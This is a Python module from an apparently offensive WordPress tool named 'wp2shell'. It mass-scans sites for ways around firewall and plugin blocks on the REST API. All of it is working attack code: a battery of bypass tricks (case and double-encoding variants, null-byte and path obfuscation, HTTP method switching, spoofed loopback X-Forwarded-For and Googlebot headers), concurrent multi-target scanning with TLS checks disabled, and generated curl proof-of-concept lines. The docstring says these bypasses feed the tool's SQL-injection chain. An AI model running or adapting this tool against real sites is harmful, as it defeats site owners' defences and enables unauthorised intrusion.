"""Non-destructive probing for a weak WordPress REST-API block (WAF/edge rule/security plugin).

Many hardened WP installs block REST API recon by literal-matching ``rest_route`` (query string)
and ``wp-json`` (path) -- exactly the pattern this tool's own SQLi-via-batch chain depends on.
That block is only as strong as its normalisation: this module fires a battery of known-weak
implementations of the same filter (case variants, encoding tricks, path obfuscation, method and
header spoofing) and verifies each one functionally against the real WP REST index response, not
just a non-403 status code. All requests are read-only (GET/HEAD/OPTIONS/PUT with no body against
the REST index route) and change no state on the target.
"""

from __future__ import annotations

import concurrent.futures
import json
import urllib.error
import urllib.request
from dataclasses import dataclass
from typing import Dict, List, Optional

from .client import _INSECURE_SSL_CONTEXT

_UA_BROWSER = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
)
_UA_GOOGLEBOT = "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
_BLOCK_STATUSES = (401, 403, 406, 429, 999)


@dataclass
class Attempt:
    name: str
    method: str
    path: str
    headers: Dict[str, str]
    poc: str


def _techniques() -> List[Attempt]:
    return [
        Attempt("uppercase-key", "GET", "/?REST_ROUTE=/", {}, 'curl -sk "{base}/?REST_ROUTE=/"'),
        Attempt("mixed-case-key", "GET", "/?rEsT_rOuTe=/", {}, 'curl -sk "{base}/?rEsT_rOuTe=/"'),
        Attempt("double-url-encode", "GET", "/?%2572est_route=/", {},
                'curl -sk "{base}/?%2572est_route=/"'),
        Attempt("null-byte-prefix", "GET", "/?%00rest_route=/", {},
                'curl -sk "{base}/?%00rest_route=/"'),
        Attempt("space-prefix", "GET", "/?%20rest_route=/", {}, 'curl -sk "{base}/?%20rest_route=/"'),
        Attempt("array-decoy-param", "GET", "/?rest_route[0]=x&rest_route=/", {},
                'curl -sk "{base}/?rest_route[0]=x&rest_route=/"'),
        Attempt("path-double-slash", "GET", "//wp-json/", {}, 'curl -sk "{base}//wp-json/"'),
        Attempt("path-dot-segment", "GET", "/./wp-json/", {}, 'curl -sk "{base}/./wp-json/"'),
        Attempt("path-encoded-dot", "GET", "/%2e/wp-json/", {}, 'curl -sk "{base}/%2e/wp-json/"'),
        Attempt("method-head", "HEAD", "/?rest_route=/", {}, 'curl -sk -I "{base}/?rest_route=/"'),
        Attempt("method-options", "OPTIONS", "/?rest_route=/", {},
                'curl -sk -X OPTIONS "{base}/?rest_route=/"'),
        Attempt("method-put", "PUT", "/?rest_route=/", {}, 'curl -sk -X PUT "{base}/?rest_route=/"'),
        Attempt("xff-loopback", "GET", "/?rest_route=/", {"X-Forwarded-For": "127.0.0.1"},
                'curl -sk -H "X-Forwarded-For: 127.0.0.1" "{base}/?rest_route=/"'),
        Attempt("xff-internal", "GET", "/?rest_route=/", {"X-Forwarded-For": "10.0.0.1"},
                'curl -sk -H "X-Forwarded-For: 10.0.0.1" "{base}/?rest_route=/"'),
        Attempt("x-originating-ip", "GET", "/?rest_route=/", {"X-Originating-IP": "127.0.0.1"},
                'curl -sk -H "X-Originating-IP: 127.0.0.1" "{base}/?rest_route=/"'),
        Attempt("ua-googlebot", "GET", "/?rest_route=/", {"User-Agent": _UA_GOOGLEBOT},
                'curl -sk -A "Googlebot" "{base}/?rest_route=/"'),
        Attempt("ua-browser", "GET", "/?rest_route=/", {"User-Agent": _UA_BROWSER},
                'curl -sk -A "Chrome" "{base}/?rest_route=/"'),
    ]


def _send(base_url: str, method: str, path: str, headers: Dict[str, str], timeout: float, proxy: Optional[str]):
    url = base_url.rstrip("/") + path
    request_headers = {"User-Agent": "wp2shell-waf-check", **headers}
    request = urllib.request.Request(url, method=method, headers=request_headers)
    handlers = [urllib.request.HTTPSHandler(context=_INSECURE_SSL_CONTEXT)]
    if proxy:
        handlers.append(urllib.request.ProxyHandler({"http": proxy, "https": proxy}))
    opener = urllib.request.build_opener(*handlers)
    try:
        resp = opener.open(request, timeout=timeout)
        status = resp.status
        body = resp.read().decode("utf-8", "replace")
        ctype = resp.headers.get("Content-Type", "")
    except urllib.error.HTTPError as exc:
        status = exc.code
        body = exc.read().decode("utf-8", "replace")
        ctype = exc.headers.get("Content-Type", "") if exc.headers else ""
    except OSError:
        return None, None, None
    return status, body, ctype


def _is_real_rest_index(status: int, body: Optional[str], ctype: Optional[str]) -> bool:
    if status != 200 or body is None:
        return False
    if "json" not in (ctype or "").lower() and not body.strip().startswith("{"):
        return False
    try:
        data = json.loads(body)
    except ValueError:
        return False
    return isinstance(data, dict) and "routes" in data and "name" in data


def probe_target(base_url: str, *, timeout: float = 10.0, proxy: Optional[str] = None) -> Optional[List[dict]]:
    """Return successful-bypass records for one target.

    ``None`` means there was nothing to test: the target was unreachable, its REST API is not
    blocked at all, or its block returned a status this probe doesn't recognise as WAF-style. An
    empty list means the block is confirmed but every technique in the battery still failed.
    """
    status, body, ctype = _send(base_url, "GET", "/?rest_route=/", {}, timeout, proxy)
    if status is None:
        return None
    if _is_real_rest_index(status, body, ctype):
        return None  # not blocked -- nothing to bypass
    if status not in _BLOCK_STATUSES:
        return None  # not a recognisable WAF-style block

    attempts = _techniques()
    successes = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=len(attempts)) as pool:
        future_map = {
            pool.submit(_send, base_url, a.method, a.path, a.headers, timeout, proxy): a
            for a in attempts
        }
        for future in concurrent.futures.as_completed(future_map):
            attempt = future_map[future]
            a_status, a_body, a_ctype = future.result()
            if _is_real_rest_index(a_status, a_body, a_ctype):
                successes.append({
                    "technique": attempt.name,
                    "poc": attempt.poc.format(base=base_url.rstrip("/")),
                    "status": a_status,
                })
    return successes


def scan(targets: List[str], *, timeout: float = 10.0, workers: int = 16, proxy: Optional[str] = None) -> Dict[str, List[dict]]:
    """Scan many targets concurrently; returns only targets with >=1 confirmed successful bypass."""
    results: Dict[str, List[dict]] = {}
    with concurrent.futures.ThreadPoolExecutor(max_workers=min(workers, len(targets) or 1)) as pool:
        future_map = {pool.submit(probe_target, t, timeout=timeout, proxy=proxy): t for t in targets}
        for future in concurrent.futures.as_completed(future_map):
            target = future_map[future]
            try:
                successes = future.result()
            except Exception:
                continue
            if successes:
                results[target] = successes
    return results
